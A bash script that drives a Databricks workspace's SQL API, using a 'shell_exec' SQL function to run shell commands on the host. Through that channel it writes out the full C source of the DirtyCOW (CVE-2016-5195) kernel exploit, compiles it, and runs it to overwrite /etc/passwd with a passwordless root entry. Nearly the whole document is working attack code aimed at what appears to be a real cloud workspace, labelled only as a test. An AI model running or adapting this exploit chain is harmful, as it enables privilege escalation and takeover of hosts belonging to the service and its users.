#!/bin/bash

TOKEN="REDACTED_DATABRICKS_TOKEN"
WORKSPACE="https://dbc-54d21f62-0426.cloud.databricks.com"
WAREHOUSE_ID="d8637cca1dc66ba3"

exec_sql() {
    local statement="$1"
    curl -s -X POST "$WORKSPACE/api/2.0/sql/statements" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"warehouse_id\": \"$WAREHOUSE_ID\",
        \"statement\": $(echo "$statement" | python3 -c "import sys, json; print(json.dumps(sys.stdin.read()))"),
        \"wait_timeout\": \"60s\"
      }" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    result = data.get('result', {}).get('data_array', [[]])
    if result and result[0]:
        print(result[0][0])
    else:
        print('[empty]')
except:
    print('[error]')
"
}

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║               DirtyCOW EXPLOIT TEST (CVE-2016-5195)            ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

echo "═══ [1/3] COMPILE DIRTYCOW POC ═══"
exec_sql "SELECT workspace.default.shell_exec('
cat > /tmp/dirtycow.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf(\"madvise %d\\n\", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    char *str = (char*)arg;
    int f = open(\"/proc/self/mem\", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf(\"procselfmem %d\\n\", c);
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    
    // Try to open /etc/passwd
    f = open(\"/etc/passwd\", O_RDONLY);
    if (f < 0) {
        printf(\"ERROR: Cannot open /etc/passwd\\n\");
        return 1;
    }
    fstat(f, &st);
    
    // Map it
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        printf(\"ERROR: mmap failed\\n\");
        return 1;
    }
    
    printf(\"DirtyCOW started\\n\");
    printf(\"Target: /etc/passwd (size: %ld)\\n\", st.st_size);
    
    // Create threads
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, \"root::0:0:root:/root:/bin/bash\\n\");
    
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    return 0;
}
EOF

gcc -pthread -o /tmp/dirtycow /tmp/dirtycow.c 2>&1
')"
echo ""

echo "═══ [2/3] CHECK IF COMPILED ═══"
exec_sql "SELECT workspace.default.shell_exec('ls -la /tmp/dirtycow 2>&1')"
echo ""

echo "═══ [3/3] RUN DIRTYCOW (5 seconds) ═══"
exec_sql "SELECT workspace.default.shell_exec('
timeout 5 /tmp/dirtycow 2>&1 || echo \"[execution finished]\"
cat /etc/passwd | grep \"root::\" || echo \"[NOT EXPLOITED - passwd unchanged]\"
')"
echo ""

echo "═══ DIRTYCOW TEST COMPLETE ═══"

